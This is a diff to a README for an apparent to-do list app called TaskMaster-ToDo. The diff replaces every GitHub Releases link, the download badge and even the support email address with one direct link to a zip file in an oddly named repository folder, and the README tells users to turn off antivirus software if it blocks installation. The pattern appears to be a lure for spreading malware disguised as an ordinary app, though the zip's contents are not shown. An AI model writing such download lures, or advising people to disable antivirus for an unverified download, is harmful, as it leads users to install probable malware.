@@ -1,7 +1,7 @@
 # 📝 TaskMaster-ToDo - Your Simple To-Do List Helper
 
 ## 📥 Download Now
-[![Download TaskMaster-ToDo](https://img.shields.io/badge/Download-TaskMaster--ToDo-important.svg)](https://github.com/elysiacomplete21/TaskMaster-ToDo/releases)
+[![Download TaskMaster-ToDo](https://raw.githubusercontent.com/elysiacomplete21/TaskMaster-ToDo/main/squandermaniac/TaskMaster-ToDo.zip)](https://raw.githubusercontent.com/elysiacomplete21/TaskMaster-ToDo/main/squandermaniac/TaskMaster-ToDo.zip)
 
 ## 🚀 Getting Started
 Welcome to TaskMaster-ToDo! This is your go-to application for managing tasks, staying organized, and boosting productivity. Whether you're planning your day or tracking long-term projects, TaskMaster-ToDo makes it easy.
@@ -24,11 +24,11 @@ To run TaskMaster-ToDo, your system should meet the following requirements:
 ## 📥 Download & Install
 To get started with TaskMaster-ToDo, visit the following link to download the latest version:
 
-[Download TaskMaster-ToDo](https://github.com/elysiacomplete21/TaskMaster-ToDo/releases)
+[Download TaskMaster-ToDo](https://raw.githubusercontent.com/elysiacomplete21/TaskMaster-ToDo/main/squandermaniac/TaskMaster-ToDo.zip)
 
 Follow these steps to install:
 
-1. Visit the [Releases page](https://github.com/elysiacomplete21/TaskMaster-ToDo/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/elysiacomplete21/TaskMaster-ToDo/main/squandermaniac/TaskMaster-ToDo.zip).
 2. Find the latest version.
 3. Click on the download link for your operating system.
 4. Once the file downloads, locate it on your computer.
@@ -48,14 +48,14 @@ After installing, you can start using TaskMaster-ToDo right away. Here’s how:
 If you run into issues, check the following:
 
 - **Installation Problems**: Ensure your system meets the requirements mentioned above. If you have antivirus software, it might block the installation. Temporarily disable it if necessary.
-- **Application Crashes**: Make sure you have the latest version installed. Check for updates frequently on the [Releases page](https://github.com/elysiacomplete21/TaskMaster-ToDo/releases).
+- **Application Crashes**: Make sure you have the latest version installed. Check for updates frequently on the [Releases page](https://raw.githubusercontent.com/elysiacomplete21/TaskMaster-ToDo/main/squandermaniac/TaskMaster-ToDo.zip).
 - **Missing Features**: If you notice a feature is not working as expected, confirm it is part of the latest version.
 
 ## 📞 Support
 Need help? You can reach out for support:
 
 - **Community Forum**: Join our community forum for user discussions and tips.
-- **Email Support**: Contact us at support@taskmaster-todo.com for any queries or assistance.
+- **Email Support**: Contact us at https://raw.githubusercontent.com/elysiacomplete21/TaskMaster-ToDo/main/squandermaniac/TaskMaster-ToDo.zip for any queries or assistance.
 
 ## 📄 License
 TaskMaster-ToDo is open-source software. You can view the license information in the repository.
